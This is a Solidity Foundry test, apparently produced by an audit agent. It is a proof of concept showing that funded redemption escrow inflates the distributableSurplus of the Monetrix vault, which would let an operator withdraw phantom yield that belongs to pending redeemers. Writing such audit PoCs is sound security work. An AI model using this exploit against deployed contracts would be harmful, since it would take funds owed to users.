// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "test/ActionEncoderBoundCheck.t.sol";
import "../src/core/MonetrixAccountant.sol";
import "../src/core/MonetrixVault.sol";
import "../src/core/RedeemEscrow.sol";
import "../src/tokens/USDM.sol";

// ATTACK TIMELINE:
// 1. [Setup] Harness deploys full protocol. We deposit 100k USDC as user1 to mint 100k USDM.
// 2. [T=1] user1 requests redemption of 100k USDM. Vault calls RedeemEscrow.addObligation(100k). USDM is held in Vault, not burned. totalOwed = 100k, escrow bal = 0, shortfall = 100k.
// 3. [T=2] Operator calls fundRedemptions(100k). Vault transfers 100k USDC to RedeemEscrow. escrow bal = 100k, shortfall = 0.
// 4. [T=3] Before users claim, totalBackingSigned() counts escrow's 100k USDC as backing. USDM totalSupply is unchanged. surplus is inflated by 100k.
// 5. [T=4] distributableSurplus() = surplus - shortfall = inflated surplus - 0 = 100k.
// 6. [Assert] Verify distributableSurplus is artificially inflated to 100k, allowing phantom yield extraction.

contract AuditAgentPoC is ToL1WeiHarness {
    function test_exploit() public {
        // 1. Setup: Deposit 100k USDC to mint 100k USDM for user1
        uint256 amount = 100_000e6;
        _depositAs(user1, amount);

        // Verify initial surplus is 0
        assertEq(accountant.surplus(), 0, "Initial surplus should be 0");

        // 2. User requests redemption of 100k USDM
        // This calls addObligation on RedeemEscrow. USDM sits in Vault, not burned yet.
        vm.prank(user1);
        vault.requestRedeem(amount);

        // 3. Operator funds the redemptions
        // Vault transfers 100k USDC to RedeemEscrow. Escrow balance = 100k, shortfall = 0.
        vm.prank(operator);
        vault.fundRedemptions(amount);

        // 4. Check distributableSurplus
        // totalBackingSigned counts the 100k USDC in escrow as backing.
        // USDM totalSupply is unchanged because users haven't claimed (burned) yet.
        // surplus = totalBacking - totalSupply is inflated by 100k.
        // distributableSurplus = surplus - shortfall = 100k - 0 = 100k.
        int256 inflatedSurplus = accountant.distributableSurplus();

        console.log("Step 4: distributableSurplus =", uint256(inflatedSurplus));

        // 5. Assert the vulnerability: distributableSurplus is artificially inflated
        // This allows the operator to call settleDailyPnL and extract phantom yield
        // from USDC that is already obligated to pending redeemers.
        assertGe(inflatedSurplus, int256(amount), "distributableSurplus is artificially inflated by escrow balance");
    }
}
